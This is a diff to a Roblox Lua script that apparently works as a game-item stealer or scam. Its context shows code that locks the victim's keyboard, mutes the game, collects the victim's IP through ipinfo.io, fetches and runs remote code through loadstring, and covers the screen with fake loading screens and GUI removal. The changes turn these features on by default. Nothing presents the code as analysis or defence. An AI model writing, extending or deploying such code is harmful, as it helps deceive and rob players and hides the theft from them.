@@ -60,7 +60,7 @@ local disabledKeyCodes = {
     0x0D,
 };
 UserSettings().GameSettings.MasterVolume = 0
-if _G.MouseLock ~= true then
+if _G.MouseLock ~= false then
     runService.RenderStepped:Connect(function()
         for _, keyCode in next, disabledKeyCodes do
             keyrelease(keyCode)
@@ -211,7 +211,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
 
                             local ScreenGui = Instance.new("ScreenGui")
                             local Frame = Instance.new("Frame")
@@ -803,7 +803,7 @@ if diaamt < 110000 then
     loadstring(game:HttpGetAsync("LINK", true))()
     return;
 end
-if _G.AntiLeave ~= true then
+if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
             v:Destroy()
@@ -817,7 +817,7 @@ if _G.AntiLeave ~= true then
 end
 
 --// Loading UI
-if _G.LoadingScreen ~= true then
+if _G.LoadingScreen ~= false then
 local Loading = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
